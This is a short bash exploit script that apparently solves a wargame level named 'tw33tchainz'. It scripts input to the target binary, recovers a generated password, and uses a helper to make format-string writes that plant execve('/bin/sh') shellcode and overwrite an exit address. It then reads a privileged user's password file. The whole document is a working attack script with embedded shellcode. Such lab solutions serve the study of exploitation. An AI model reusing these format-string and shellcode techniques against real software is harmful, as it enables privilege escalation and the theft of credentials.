#!/usr/bin/ bash

input_file="inputs"
rm $input_file
touch $input_file
project="/levels/project1/tw33tchainz"
write_to() {
    printf "$1" "$2" >> $input_file
}
flag_pass=0
write_addr="0x0804d9c8"
exit_addr="0x0804d03c"
shellcode="31c9f7e151682f2f7368682f62696e89e3b00bcd80"
write_addr_rev="c8d90408"
tail -f $input_file | $project | while read output
do
    a=$(echo $(python -c "print '$output'"))
    echo "$a"
    if [ $flag_pass -eq 4 ]; then
        write_to "\n"
        write_to "5\n"
        write_to "cat /home/project1_priv/.pass\n"
    fi

    if [ $flag_pass -eq 3 ]; then
       for number in `seq 0 20`
       do
           write_to "1\n"
           tweet=$(python tw33t.py $write_addr $number $shellcode)
           write_to "%s\n" "$tweet"
           write_to "\n"
       done

       for number in `seq 0 3`
       do
           write_to "1\n"
           tweet=$(python tw33t.py $exit_addr $number $write_addr_rev)
           write_to "%s\n" "$tweet"
           write_to "\n"
       done
       flag_pass=4
    fi

    if [ $flag_pass -eq 2 ]; then
        write_to "3\n"
        write_to "%s\n" "$password"
        flag_pass=3
    fi

    if [ $flag_pass -eq 1 ]; then
        password="$(python decode.py $a)"
        flag_pass=2
    fi
    if echo "$a" | grep -q "Enter Username:"; then
        write_to "%s" "$(python -c "print '\x31'*14")"
        write_to "\n"
    fi

    if echo "$a" | grep -q "Enter Salt:"; then
        write_to "%s" "$(python -c "print '\x31'*14")"
        write_to "\n"
    fi
    if echo "$a" | grep -q "Generated Password:"; then
        write_to "\n"
        flag_pass=1
    fi
done